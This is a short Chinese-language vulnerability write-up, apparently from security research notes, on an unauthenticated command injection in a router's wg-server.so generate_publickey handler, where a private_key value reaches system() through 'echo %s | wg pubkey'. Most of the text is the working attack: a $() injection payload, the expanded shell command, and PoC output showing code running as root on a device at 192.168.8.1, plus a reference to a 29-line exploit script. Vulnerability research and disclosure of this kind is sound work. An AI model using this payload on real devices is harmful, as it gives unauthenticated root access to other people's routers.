# 额外漏洞：wg-server.generate_publickey private_key — 未认证 echo 注入 RCE

> wg-server.so 的 `generate_publickey` 将用户 `private_key` 通过 `echo %s | wg pubkey` → `system()` 执行，`$()` 命令替换实现未认证 RCE。

## Ghidra 验证

wg-server.so strings 确认：`echo %s | wg pubkey` — `generate_publickey` @ 0xb038 (8基本块/580B)

## 注入原理

```
private_key = "$(id > /tmp/poc)"
→ cmd = "echo $(id > /tmp/poc) | wg pubkey"
→ shell: $() 展开 → id > /tmp/poc → 替换为空
→ echo "" | wg pubkey → wg pubkey 失败（无输入）
→ 返回 "generate publickey failed"（预期行为，RCE 已发生）
```

## PoC 验证

```
$ python3 poc_wg_generate_pubkey_rce.py https://192.168.8.1
[+] payload private_key='$( id > /tmp/poc_wg_pubkey )'
[+] response: 0 {"err_msg": "generate publickey failed", "err_code": -11}

$ curl ... /download path=/tmp/poc_wg_pubkey
uid=0(root) gid=0(root)
```

**认证**: 无 | **PoC**: `exp/poc_wg_generate_pubkey_rce.py` (29行)
